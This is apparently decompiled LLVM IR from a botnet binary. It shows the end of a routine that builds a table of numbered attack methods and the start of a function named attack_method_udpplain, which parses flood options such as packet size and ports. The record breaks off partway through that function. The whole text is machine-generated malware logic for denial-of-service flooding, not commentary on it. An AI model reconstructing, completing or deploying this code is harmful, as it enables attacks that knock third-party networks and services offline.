  %v5_86b4 = mul nuw nsw i32 %v3_86ac, 4
  %v6_86b4 = add i32 %v5_86b4, %v5_86a8
  %v7_86b4 = inttoptr i32 %v6_86b4 to i32*
  store i32 %v0_86b4, i32* %v7_86b4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_86bc = load i32, i32* %r3.global-to-local, align 4
  %v1_86bc = load i32, i32* @r8, align 4
  %v2_86bc = add i32 %v1_86bc, %v0_86bc
  store i32 %v2_86bc, i32* %r3.global-to-local, align 4
  %v1_86c4 = trunc i32 %v2_86bc to i8
  %v2_86c4 = load i32, i32* @r4, align 4
  %v3_86c4 = inttoptr i32 %v2_86c4 to i8*
  store i8 %v1_86c4, i8* %v3_86c4, align 1
  %v0_86c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_86c8 = load i32, i32* @r6, align 4
  %v2_86c8 = inttoptr i32 %v1_86c8 to i32*
  store i32 %v0_86c8, i32* %v2_86c8, align 4
  %v2_86cc = call i32 @calloc(i32 %v1_86bc, i32 8)
  %v2_86d0 = load i8, i8* bitcast (i8** @global_var_2222c.28 to i8*), align 4
  %v3_86d0 = zext i8 %v2_86d0 to i32
  store i32 ptrtoint (i32* @global_var_a4c0.40 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_86cc, i32* @r5, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_86e0 = load i32, i32* @r8, align 4
  %v2_86e0 = add i32 %v1_86e0, %v3_86d0
  store i32 %v2_86e0, i32* %r1.global-to-local, align 4
  %v2_86e4 = load i32, i32* @global_var_22230.30, align 4
  %v2_86e8 = inttoptr i32 %v2_86cc to i32*
  store i32 ptrtoint (i32* @global_var_a4c0.40 to i32), i32* %v2_86e8, align 4
  %v3_86ec = load i32, i32* @r5, align 4
  %v4_86ec = add i32 %v3_86ec, 4
  %v5_86ec = inttoptr i32 %v4_86ec to i8*
  store i8 2, i8* %v5_86ec, align 1
  %v0_86f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_86f0 = mul i32 %v0_86f0, 4
  store i32 %v3_86f0, i32* %r1.global-to-local, align 4
  %v5_86f4 = inttoptr i32 %v2_86e4 to i32*
  %v6_86f4 = call i32 @realloc(i32* %v5_86f4, i32 %v3_86f0, i32 ptrtoint (i32* @global_var_a4c0.40 to i32), i32 2)
  %v2_86f8 = load i8, i8* bitcast (i8** @global_var_2222c.28 to i8*), align 4
  %v3_86f8 = zext i8 %v2_86f8 to i32
  store i32 %v3_86f8, i32* %r3.global-to-local, align 4
  store i32 %v6_86f4, i32* %r2.global-to-local, align 4
  %v0_8700 = load i32, i32* @r5, align 4
  %v5_8700 = mul nuw nsw i32 %v3_86f8, 4
  %v6_8700 = add i32 %v5_8700, %v6_86f4
  %v7_8700 = inttoptr i32 %v6_8700 to i32*
  store i32 %v0_8700, i32* %v7_8700, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_8708 = load i32, i32* %r3.global-to-local, align 4
  %v1_8708 = load i32, i32* @r8, align 4
  %v2_8708 = add i32 %v1_8708, %v0_8708
  store i32 %v2_8708, i32* %r3.global-to-local, align 4
  %v1_8710 = load i32, i32* @r6, align 4
  %v2_8710 = inttoptr i32 %v1_8710 to i32*
  store i32 %v6_86f4, i32* %v2_8710, align 4
  %v0_8714 = load i32, i32* %r3.global-to-local, align 4
  %v1_8714 = trunc i32 %v0_8714 to i8
  %v2_8714 = load i32, i32* @r4, align 4
  %v3_8714 = inttoptr i32 %v2_8714 to i8*
  store i8 %v1_8714, i8* %v3_8714, align 1
  %v2_8718 = call i32 @calloc(i32 %v1_8708, i32 8)
  %v2_871c = load i8, i8* bitcast (i8** @global_var_2222c.28 to i8*), align 4
  %v3_871c = zext i8 %v2_871c to i32
  store i32 ptrtoint (i32* @global_var_89ac.42 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r7, align 4
  store i32 %v2_8718, i32* @r5, align 4
  %v1_872c = load i32, i32* @r8, align 4
  %v2_872c = add i32 %v1_872c, %v3_871c
  store i32 %v2_872c, i32* %r1.global-to-local, align 4
  %v2_8730 = load i32, i32* @global_var_22230.30, align 4
  %v2_8734 = inttoptr i32 %v2_8718 to i32*
  store i32 ptrtoint (i32* @global_var_89ac.42 to i32), i32* %v2_8734, align 4
  %v0_8738 = load i32, i32* @r7, align 4
  %v1_8738 = trunc i32 %v0_8738 to i8
  %v2_8738 = load i32, i32* @r5, align 4
  %v3_8738 = add i32 %v2_8738, 4
  %v4_8738 = inttoptr i32 %v3_8738 to i8*
  store i8 %v1_8738, i8* %v4_8738, align 1
  %v0_873c = load i32, i32* %r1.global-to-local, align 4
  %v3_873c = mul i32 %v0_873c, 4
  store i32 %v3_873c, i32* %r1.global-to-local, align 4
  %v4_8740 = inttoptr i32 %v2_8730 to i32*
  %v5_8740 = call i32 @realloc(i32* %v4_8740, i32 %v3_873c, i32 %v6_86f4, i32 ptrtoint (i32* @global_var_89ac.42 to i32))
  %v2_8744 = load i8, i8* bitcast (i8** @global_var_2222c.28 to i8*), align 4
  %v3_8744 = zext i8 %v2_8744 to i32
  store i32 %v3_8744, i32* %r3.global-to-local, align 4
  store i32 %v5_8740, i32* %r2.global-to-local, align 4
  %v0_874c = load i32, i32* @r5, align 4
  %v5_874c = mul nuw nsw i32 %v3_8744, 4
  %v6_874c = add i32 %v5_874c, %v5_8740
  %v7_874c = inttoptr i32 %v6_874c to i32*
  store i32 %v0_874c, i32* %v7_874c, align 4
  %v0_8750 = load i32, i32* @r7, align 4
  store i32 %v0_8750, i32* %r1.global-to-local, align 4
  %v0_8754 = load i32, i32* %r3.global-to-local, align 4
  %v1_8754 = load i32, i32* @r8, align 4
  %v2_8754 = add i32 %v1_8754, %v0_8754
  store i32 %v2_8754, i32* %r3.global-to-local, align 4
  %v1_875c = trunc i32 %v2_8754 to i8
  %v2_875c = load i32, i32* @r4, align 4
  %v3_875c = inttoptr i32 %v2_875c to i8*
  store i8 %v1_875c, i8* %v3_875c, align 1
  %v0_8760 = load i32, i32* %r2.global-to-local, align 4
  %v1_8760 = load i32, i32* @r6, align 4
  %v2_8760 = inttoptr i32 %v1_8760 to i32*
  store i32 %v0_8760, i32* %v2_8760, align 4
  %v2_8764 = call i32 @calloc(i32 %v1_8754, i32 %v0_8750)
  %v2_8768 = load i8, i8* bitcast (i8** @global_var_2222c.28 to i8*), align 4
  %v3_8768 = zext i8 %v2_8768 to i32
  store i32 ptrtoint (i32* @global_var_c1dc.44 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8764, i32* @r5, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_8778 = load i32, i32* @r8, align 4
  %v2_8778 = add i32 %v1_8778, %v3_8768
  store i32 %v2_8778, i32* %r1.global-to-local, align 4
  %v2_877c = load i32, i32* @global_var_22230.30, align 4
  %v2_8780 = inttoptr i32 %v2_8764 to i32*
  store i32 ptrtoint (i32* @global_var_c1dc.44 to i32), i32* %v2_8780, align 4
  %v3_8784 = load i32, i32* @r5, align 4
  %v4_8784 = add i32 %v3_8784, 4
  %v5_8784 = inttoptr i32 %v4_8784 to i8*
  store i8 3, i8* %v5_8784, align 1
  %v0_8788 = load i32, i32* %r1.global-to-local, align 4
  %v3_8788 = mul i32 %v0_8788, 4
  store i32 %v3_8788, i32* %r1.global-to-local, align 4
  %v5_878c = inttoptr i32 %v2_877c to i32*
  %v6_878c = call i32 @realloc(i32* %v5_878c, i32 %v3_8788, i32 ptrtoint (i32* @global_var_c1dc.44 to i32), i32 3)
  %v2_8790 = load i8, i8* bitcast (i8** @global_var_2222c.28 to i8*), align 4
  %v3_8790 = zext i8 %v2_8790 to i32
  store i32 %v3_8790, i32* %r3.global-to-local, align 4
  store i32 %v6_878c, i32* %r2.global-to-local, align 4
  %v0_8798 = load i32, i32* @r5, align 4
  %v5_8798 = mul nuw nsw i32 %v3_8790, 4
  %v6_8798 = add i32 %v5_8798, %v6_878c
  %v7_8798 = inttoptr i32 %v6_8798 to i32*
  store i32 %v0_8798, i32* %v7_8798, align 4
  %v0_879c = load i32, i32* @r7, align 4
  store i32 %v0_879c, i32* %r1.global-to-local, align 4
  %v0_87a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_87a0 = load i32, i32* @r8, align 4
  %v2_87a0 = add i32 %v1_87a0, %v0_87a0
  store i32 %v2_87a0, i32* %r3.global-to-local, align 4
  %v1_87a8 = trunc i32 %v2_87a0 to i8
  %v2_87a8 = load i32, i32* @r4, align 4
  %v3_87a8 = inttoptr i32 %v2_87a8 to i8*
  store i8 %v1_87a8, i8* %v3_87a8, align 1
  %v0_87ac = load i32, i32* %r2.global-to-local, align 4
  %v1_87ac = load i32, i32* @r6, align 4
  %v2_87ac = inttoptr i32 %v1_87ac to i32*
  store i32 %v0_87ac, i32* %v2_87ac, align 4
  %v2_87b0 = call i32 @calloc(i32 %v1_87a0, i32 %v0_879c)
  %v2_87b4 = load i8, i8* bitcast (i8** @global_var_2222c.28 to i8*), align 4
  %v3_87b4 = zext i8 %v2_87b4 to i32
  store i32 ptrtoint (i32* @global_var_bae4.46 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87b0, i32* @r5, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_87c4 = load i32, i32* @r8, align 4
  %v2_87c4 = add i32 %v1_87c4, %v3_87b4
  store i32 %v2_87c4, i32* %r1.global-to-local, align 4
  %v2_87c8 = load i32, i32* @global_var_22230.30, align 4
  %v2_87cc = inttoptr i32 %v2_87b0 to i32*
  store i32 ptrtoint (i32* @global_var_bae4.46 to i32), i32* %v2_87cc, align 4
  %v3_87d0 = load i32, i32* @r5, align 4
  %v4_87d0 = add i32 %v3_87d0, 4
  %v5_87d0 = inttoptr i32 %v4_87d0 to i8*
  store i8 4, i8* %v5_87d0, align 1
  %v0_87d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_87d4 = mul i32 %v0_87d4, 4
  store i32 %v3_87d4, i32* %r1.global-to-local, align 4
  %v5_87d8 = inttoptr i32 %v2_87c8 to i32*
  %v6_87d8 = call i32 @realloc(i32* %v5_87d8, i32 %v3_87d4, i32 ptrtoint (i32* @global_var_bae4.46 to i32), i32 4)
  %v2_87dc = load i8, i8* bitcast (i8** @global_var_2222c.28 to i8*), align 4
  %v3_87dc = zext i8 %v2_87dc to i32
  store i32 %v3_87dc, i32* %r3.global-to-local, align 4
  store i32 %v6_87d8, i32* %r2.global-to-local, align 4
  %v0_87e4 = load i32, i32* @r5, align 4
  %v5_87e4 = mul nuw nsw i32 %v3_87dc, 4
  %v6_87e4 = add i32 %v5_87e4, %v6_87d8
  %v7_87e4 = inttoptr i32 %v6_87e4 to i32*
  store i32 %v0_87e4, i32* %v7_87e4, align 4
  %v0_87e8 = load i32, i32* @r7, align 4
  store i32 %v0_87e8, i32* %r1.global-to-local, align 4
  %v0_87ec = load i32, i32* %r3.global-to-local, align 4
  %v1_87ec = load i32, i32* @r8, align 4
  %v2_87ec = add i32 %v1_87ec, %v0_87ec
  store i32 %v2_87ec, i32* %r3.global-to-local, align 4
  %v1_87f4 = trunc i32 %v2_87ec to i8
  %v2_87f4 = load i32, i32* @r4, align 4
  %v3_87f4 = inttoptr i32 %v2_87f4 to i8*
  store i8 %v1_87f4, i8* %v3_87f4, align 1
  %v0_87f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_87f8 = load i32, i32* @r6, align 4
  %v2_87f8 = inttoptr i32 %v1_87f8 to i32*
  store i32 %v0_87f8, i32* %v2_87f8, align 4
  %v2_87fc = call i32 @calloc(i32 %v1_87ec, i32 %v0_87e8)
  %v2_8800 = load i8, i8* bitcast (i8** @global_var_2222c.28 to i8*), align 4
  %v3_8800 = zext i8 %v2_8800 to i32
  store i32 ptrtoint (i32* @global_var_b330.48 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87fc, i32* @r5, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_8810 = load i32, i32* @r8, align 4
  %v2_8810 = add i32 %v1_8810, %v3_8800
  store i32 %v2_8810, i32* %r1.global-to-local, align 4
  %v2_8814 = load i32, i32* @global_var_22230.30, align 4
  %v2_8818 = inttoptr i32 %v2_87fc to i32*
  store i32 ptrtoint (i32* @global_var_b330.48 to i32), i32* %v2_8818, align 4
  %v3_881c = load i32, i32* @r5, align 4
  %v4_881c = add i32 %v3_881c, 4
  %v5_881c = inttoptr i32 %v4_881c to i8*
  store i8 5, i8* %v5_881c, align 1
  %v0_8820 = load i32, i32* %r1.global-to-local, align 4
  %v3_8820 = mul i32 %v0_8820, 4
  store i32 %v3_8820, i32* %r1.global-to-local, align 4
  %v5_8824 = inttoptr i32 %v2_8814 to i32*
  %v6_8824 = call i32 @realloc(i32* %v5_8824, i32 %v3_8820, i32 ptrtoint (i32* @global_var_b330.48 to i32), i32 5)
  %v2_8828 = load i8, i8* bitcast (i8** @global_var_2222c.28 to i8*), align 4
  %v3_8828 = zext i8 %v2_8828 to i32
  store i32 %v3_8828, i32* %r3.global-to-local, align 4
  store i32 %v6_8824, i32* %r2.global-to-local, align 4
  %v0_8830 = load i32, i32* @r5, align 4
  %v5_8830 = mul nuw nsw i32 %v3_8828, 4
  %v6_8830 = add i32 %v5_8830, %v6_8824
  %v7_8830 = inttoptr i32 %v6_8830 to i32*
  store i32 %v0_8830, i32* %v7_8830, align 4
  %v0_8834 = load i32, i32* @r7, align 4
  store i32 %v0_8834, i32* %r1.global-to-local, align 4
  %v0_8838 = load i32, i32* %r3.global-to-local, align 4
  %v1_8838 = load i32, i32* @r8, align 4
  %v2_8838 = add i32 %v1_8838, %v0_8838
  store i32 %v2_8838, i32* %r3.global-to-local, align 4
  %v1_8840 = trunc i32 %v2_8838 to i8
  %v2_8840 = load i32, i32* @r4, align 4
  %v3_8840 = inttoptr i32 %v2_8840 to i8*
  store i8 %v1_8840, i8* %v3_8840, align 1
  %v0_8844 = load i32, i32* %r2.global-to-local, align 4
  %v1_8844 = load i32, i32* @r6, align 4
  %v2_8844 = inttoptr i32 %v1_8844 to i32*
  store i32 %v0_8844, i32* %v2_8844, align 4
  %v2_8848 = call i32 @calloc(i32 %v1_8838, i32 %v0_8834)
  %v2_884c = load i8, i8* bitcast (i8** @global_var_2222c.28 to i8*), align 4
  %v3_884c = zext i8 %v2_884c to i32
  store i32 43900, i32* %r2.global-to-local, align 4
  store i32 %v2_8848, i32* @r5, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_885c = load i32, i32* @r8, align 4
  %v2_885c = add i32 %v1_885c, %v3_884c
  store i32 %v2_885c, i32* %r1.global-to-local, align 4
  %v2_8860 = load i32, i32* @global_var_22230.30, align 4
  %v2_8864 = inttoptr i32 %v2_8848 to i32*
  store i32 43900, i32* %v2_8864, align 4
  %v3_8868 = load i32, i32* @r5, align 4
  %v4_8868 = add i32 %v3_8868, 4
  %v5_8868 = inttoptr i32 %v4_8868 to i8*
  store i8 10, i8* %v5_8868, align 1
  %v0_886c = load i32, i32* %r1.global-to-local, align 4
  %v3_886c = mul i32 %v0_886c, 4
  store i32 %v3_886c, i32* %r1.global-to-local, align 4
  %v5_8870 = inttoptr i32 %v2_8860 to i32*
  %v6_8870 = call i32 @realloc(i32* %v5_8870, i32 %v3_886c, i32 43900, i32 10)
  %v2_8874 = load i8, i8* bitcast (i8** @global_var_2222c.28 to i8*), align 4
  %v3_8874 = zext i8 %v2_8874 to i32
  store i32 %v3_8874, i32* %r3.global-to-local, align 4
  store i32 %v6_8870, i32* %r2.global-to-local, align 4
  %v0_887c = load i32, i32* @r5, align 4
  %v5_887c = mul nuw nsw i32 %v3_8874, 4
  %v6_887c = add i32 %v5_887c, %v6_8870
  %v7_887c = inttoptr i32 %v6_887c to i32*
  store i32 %v0_887c, i32* %v7_887c, align 4
  %v0_8880 = load i32, i32* @r7, align 4
  store i32 %v0_8880, i32* %r1.global-to-local, align 4
  %v0_8884 = load i32, i32* %r3.global-to-local, align 4
  %v1_8884 = load i32, i32* @r8, align 4
  %v2_8884 = add i32 %v1_8884, %v0_8884
  store i32 %v2_8884, i32* %r3.global-to-local, align 4
  %v1_888c = trunc i32 %v2_8884 to i8
  %v2_888c = load i32, i32* @r4, align 4
  %v3_888c = inttoptr i32 %v2_888c to i8*
  store i8 %v1_888c, i8* %v3_888c, align 1
  %v0_8890 = load i32, i32* %r2.global-to-local, align 4
  %v1_8890 = load i32, i32* @r6, align 4
  %v2_8890 = inttoptr i32 %v1_8890 to i32*
  store i32 %v0_8890, i32* %v2_8890, align 4
  %v2_8894 = call i32 @calloc(i32 %v1_8884, i32 %v0_8880)
  %v2_8898 = load i8, i8* bitcast (i8** @global_var_2222c.28 to i8*), align 4
  %v3_8898 = zext i8 %v2_8898 to i32
  store i32 ptrtoint (i32* @global_var_9a6c.51 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8894, i32* @r5, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_88a8 = load i32, i32* @r8, align 4
  %v2_88a8 = add i32 %v1_88a8, %v3_8898
  store i32 %v2_88a8, i32* %r1.global-to-local, align 4
  %v2_88ac = load i32, i32* @global_var_22230.30, align 4
  %v2_88b0 = inttoptr i32 %v2_8894 to i32*
  store i32 ptrtoint (i32* @global_var_9a6c.51 to i32), i32* %v2_88b0, align 4
  %v3_88b4 = load i32, i32* @r5, align 4
  %v4_88b4 = add i32 %v3_88b4, 4
  %v5_88b4 = inttoptr i32 %v4_88b4 to i8*
  store i8 6, i8* %v5_88b4, align 1
  %v0_88b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_88b8 = mul i32 %v0_88b8, 4
  store i32 %v3_88b8, i32* %r1.global-to-local, align 4
  %v5_88bc = inttoptr i32 %v2_88ac to i32*
  %v6_88bc = call i32 @realloc(i32* %v5_88bc, i32 %v3_88b8, i32 ptrtoint (i32* @global_var_9a6c.51 to i32), i32 6)
  %v2_88c0 = load i8, i8* bitcast (i8** @global_var_2222c.28 to i8*), align 4
  %v3_88c0 = zext i8 %v2_88c0 to i32
  store i32 %v3_88c0, i32* %r3.global-to-local, align 4
  store i32 %v6_88bc, i32* %r2.global-to-local, align 4
  %v0_88c8 = load i32, i32* @r5, align 4
  %v5_88c8 = mul nuw nsw i32 %v3_88c0, 4
  %v6_88c8 = add i32 %v5_88c8, %v6_88bc
  %v7_88c8 = inttoptr i32 %v6_88c8 to i32*
  store i32 %v0_88c8, i32* %v7_88c8, align 4
  %v0_88cc = load i32, i32* @r7, align 4
  store i32 %v0_88cc, i32* %r1.global-to-local, align 4
  %v0_88d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_88d0 = load i32, i32* @r8, align 4
  %v2_88d0 = add i32 %v1_88d0, %v0_88d0
  store i32 %v2_88d0, i32* %r3.global-to-local, align 4
  %v1_88d8 = trunc i32 %v2_88d0 to i8
  %v2_88d8 = load i32, i32* @r4, align 4
  %v3_88d8 = inttoptr i32 %v2_88d8 to i8*
  store i8 %v1_88d8, i8* %v3_88d8, align 1
  %v0_88dc = load i32, i32* %r2.global-to-local, align 4
  %v1_88dc = load i32, i32* @r6, align 4
  %v2_88dc = inttoptr i32 %v1_88dc to i32*
  store i32 %v0_88dc, i32* %v2_88dc, align 4
  %v2_88e0 = call i32 @calloc(i32 %v1_88d0, i32 %v0_88cc)
  %v2_88e4 = load i8, i8* bitcast (i8** @global_var_2222c.28 to i8*), align 4
  %v3_88e4 = zext i8 %v2_88e4 to i32
  store i32 ptrtoint (i32* @global_var_93d8.53 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_88e0, i32* @r5, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_88f4 = load i32, i32* @r8, align 4
  %v2_88f4 = add i32 %v1_88f4, %v3_88e4
  store i32 %v2_88f4, i32* %r1.global-to-local, align 4
  %v2_88f8 = load i32, i32* @global_var_22230.30, align 4
  %v2_88fc = inttoptr i32 %v2_88e0 to i32*
  store i32 ptrtoint (i32* @global_var_93d8.53 to i32), i32* %v2_88fc, align 4
  %v3_8900 = load i32, i32* @r5, align 4
  %v4_8900 = add i32 %v3_8900, 4
  %v5_8900 = inttoptr i32 %v4_8900 to i8*
  store i8 7, i8* %v5_8900, align 1
  %v0_8904 = load i32, i32* %r1.global-to-local, align 4
  %v3_8904 = mul i32 %v0_8904, 4
  store i32 %v3_8904, i32* %r1.global-to-local, align 4
  %v5_8908 = inttoptr i32 %v2_88f8 to i32*
  %v6_8908 = call i32 @realloc(i32* %v5_8908, i32 %v3_8904, i32 ptrtoint (i32* @global_var_93d8.53 to i32), i32 7)
  %v2_890c = load i8, i8* bitcast (i8** @global_var_2222c.28 to i8*), align 4
  %v3_890c = zext i8 %v2_890c to i32
  store i32 %v3_890c, i32* %r3.global-to-local, align 4
  store i32 %v6_8908, i32* %r2.global-to-local, align 4
  %v0_8914 = load i32, i32* @r5, align 4
  %v5_8914 = mul nuw nsw i32 %v3_890c, 4
  %v6_8914 = add i32 %v5_8914, %v6_8908
  %v7_8914 = inttoptr i32 %v6_8914 to i32*
  store i32 %v0_8914, i32* %v7_8914, align 4
  %v0_8918 = load i32, i32* @r7, align 4
  store i32 %v0_8918, i32* %r1.global-to-local, align 4
  %v0_891c = load i32, i32* %r3.global-to-local, align 4
  %v1_891c = load i32, i32* @r8, align 4
  %v2_891c = add i32 %v1_891c, %v0_891c
  store i32 %v2_891c, i32* %r3.global-to-local, align 4
  %v1_8924 = trunc i32 %v2_891c to i8
  %v2_8924 = load i32, i32* @r4, align 4
  %v3_8924 = inttoptr i32 %v2_8924 to i8*
  store i8 %v1_8924, i8* %v3_8924, align 1
  %v0_8928 = load i32, i32* %r2.global-to-local, align 4
  %v1_8928 = load i32, i32* @r6, align 4
  %v2_8928 = inttoptr i32 %v1_8928 to i32*
  store i32 %v0_8928, i32* %v2_8928, align 4
  %v2_892c = call i32 @calloc(i32 %v1_891c, i32 %v0_8918)
  %v2_8930 = load i8, i8* bitcast (i8** @global_var_2222c.28 to i8*), align 4
  %v3_8930 = zext i8 %v2_8930 to i32
  store i32 35916, i32* %r2.global-to-local, align 4
  store i32 %v2_892c, i32* @r5, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_8940 = load i32, i32* @r8, align 4
  %v2_8940 = add i32 %v1_8940, %v3_8930
  store i32 %v2_8940, i32* %r1.global-to-local, align 4
  %v2_8944 = load i32, i32* @global_var_22230.30, align 4
  %v2_8948 = inttoptr i32 %v2_892c to i32*
  store i32 35916, i32* %v2_8948, align 4
  %v3_894c = load i32, i32* @r5, align 4
  %v4_894c = add i32 %v3_894c, 4
  %v5_894c = inttoptr i32 %v4_894c to i8*
  store i8 9, i8* %v5_894c, align 1
  %v0_8950 = load i32, i32* %r1.global-to-local, align 4
  %v3_8950 = mul i32 %v0_8950, 4
  store i32 %v3_8950, i32* %r1.global-to-local, align 4
  %v5_8954 = inttoptr i32 %v2_8944 to i32*
  %v6_8954 = call i32 @realloc(i32* %v5_8954, i32 %v3_8950, i32 35916, i32 9)
  %v2_8958 = load i8, i8* bitcast (i8** @global_var_2222c.28 to i8*), align 4
  %v3_8958 = zext i8 %v2_8958 to i32
  store i32 %v3_8958, i32* %r3.global-to-local, align 4
  %v1_895c = load i32, i32* @r6, align 4
  %v2_895c = inttoptr i32 %v1_895c to i32*
  store i32 %v6_8954, i32* %v2_895c, align 4
  %v0_8960 = load i32, i32* @r5, align 4
  %v2_8960 = load i32, i32* %r3.global-to-local, align 4
  %v5_8960 = mul i32 %v2_8960, 4
  %v6_8960 = add i32 %v5_8960, %v6_8954
  %v7_8960 = inttoptr i32 %v6_8960 to i32*
  store i32 %v0_8960, i32* %v7_8960, align 4
  %v0_8964 = load i32, i32* %r3.global-to-local, align 4
  %v1_8964 = load i32, i32* @r8, align 4
  %v2_8964 = add i32 %v1_8964, %v0_8964
  store i32 %v2_8964, i32* %r2.global-to-local, align 4
  %v1_896c = trunc i32 %v2_8964 to i8
  %v2_896c = load i32, i32* @r4, align 4
  %v3_896c = inttoptr i32 %v2_896c to i8*
  store i8 %v1_896c, i8* %v3_896c, align 1
  %v2_8970 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_8970, i32* @r4, align 4
  store i32 %v6_8620, i32* @r5, align 4
  store i32 %v9_8620, i32* @r6, align 4
  store i32 %v12_8620, i32* @r7, align 4
  store i32 %v15_8620, i32* @r8, align 4
  ret i32 %v1_8964

; uselistorder directives
  uselistorder i32 %v1_8964, { 1, 0 }
  uselistorder i32 %v3_8950, { 1, 0 }
  uselistorder i32 %v1_891c, { 1, 0 }
  uselistorder i32 %v3_8904, { 1, 0 }
  uselistorder i32 %v1_88d0, { 1, 0 }
  uselistorder i32 %v3_88b8, { 1, 0 }
  uselistorder i32 %v1_8884, { 1, 0 }
  uselistorder i32 %v3_886c, { 1, 0 }
  uselistorder i32 %v1_8838, { 1, 0 }
  uselistorder i32 %v3_8820, { 1, 0 }
  uselistorder i32 %v1_87ec, { 1, 0 }
  uselistorder i32 %v3_87d4, { 1, 0 }
  uselistorder i32 %v1_87a0, { 1, 0 }
  uselistorder i32 %v3_8788, { 1, 0 }
  uselistorder i32 %v1_8754, { 1, 0 }
  uselistorder i32 %v3_873c, { 1, 0 }
  uselistorder i32 %v1_8708, { 1, 0 }
  uselistorder i32 %v6_86f4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_86f0, { 1, 0 }
  uselistorder i32 %v1_86bc, { 1, 0 }
  uselistorder i32 %v3_86a4, { 1, 0 }
  uselistorder i32 %v2_8680, { 1, 0 }
  uselistorder i32 %v6_865c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8658, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_2222c.28 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_2222d.36 to i32), { 2, 1, 0 }
  uselistorder i8** @global_var_2222c.28, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_2222c.28 to i32), { 1, 0 }
}

define i32 @attack_method_udpplain(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_89ac = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_89c8 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_89c8, i32* @sl, align 4
  %v0_89d4 = load i32, i32* @r7, align 4
  %v2_89d8 = call i32 @calloc(i32 %v0_89d4, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_89e4 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_89d8, i32* @r8, align 4
  %v0_89f4 = load i32, i32* @r5, align 4
  %v4_89f8 = inttoptr i32 %v0_89e4 to i32*
  %v5_89f8 = call i32 @attack_get_opt_int(i32 %v0_89f4, i32* %v4_89f8, i32 7, i32 65535)
  %v3_8a00 = urem i32 %v5_89f8, 65536
  %v0_8a04 = load i32, i32* @r6, align 4
  %v0_8a0c = load i32, i32* @r4, align 4
  store i32 %v0_8a0c, i32* %r3.global-to-local, align 4
  %v0_8a10 = load i32, i32* @r5, align 4
  %v5_8a18 = inttoptr i32 %v0_8a04 to i32*
  %v6_8a18 = call i32 @attack_get_opt_int(i32 %v0_8a10, i32* %v5_8a18, i32 6, i32 %v0_8a0c)
  %v0_8a1c = load i32, i32* @r6, align 4
  %v3_8a20 = mul i32 %v6_8a18, 65536
  store i32 %v3_8a20, i32* %sb.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_8a2c = load i32, i32* @r5, align 4
  %v4_8a30 = inttoptr i32 %v0_8a1c to i32*
  %v5_8a30 = call i32 @attack_get_opt_int(i32 %v0_8a2c, i32* %v4_8a30, i32 0, i32 512)
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8a40 = load i32, i32* @r6, align 4
  %v0_8a44 = load i32, i32* @r5, align 4
  %v3_8a48 = urem i32 %v5_8a30, 65536
  store i32 %v3_8a48, i32* @r5, align 4
  %v4_8a4c = inttoptr i32 %v0_8a40 to i32*
  %v5_8a4c = call i32 @attack_get_opt_int(i32 %v0_8a44, i32* %v4_8a4c, i32 1, i32 1)
  %v0_8a50 = load i32, i32* %sb.global-to-local, align 4
  %v3_8a50 = udiv i32 %v0_8a50, 65536
  store i32 %v3_8a50, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_8a58 = load i32, i32* @r4, align 4
  %v9_8a58 = icmp eq i32 %v3_8a50, %v1_8a58
  br i1 %v9_8a58, label %dec_label_pc_8a88, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v4_8a70 = udiv i32 %v0_8a50, 16777216
  store i32 %v4_8a70, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8a98

dec_label_pc_8a88:                                ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v0_8a88 = call i32 @rand_next()
  br label %dec_label_pc_8a98

dec_label_pc_8a98:                                ; preds = %bb, %dec_label_pc_8a88
  %v0_8a7c10 = urem i32 %v5_8a4c, 256
  %v0_8a98 = load i32, i32* @r7, align 4
  %v2_8a98 = icmp eq i32 %v0_8a98, 0
  br i1 %v2_8a98, label %dec_label_pc_8bd8, label %dec_label_pc_8aa0

dec_label_pc_8aa0:                                ; preds = %dec_label_pc_8a98
  store i32 0, i32* @sb, align 4
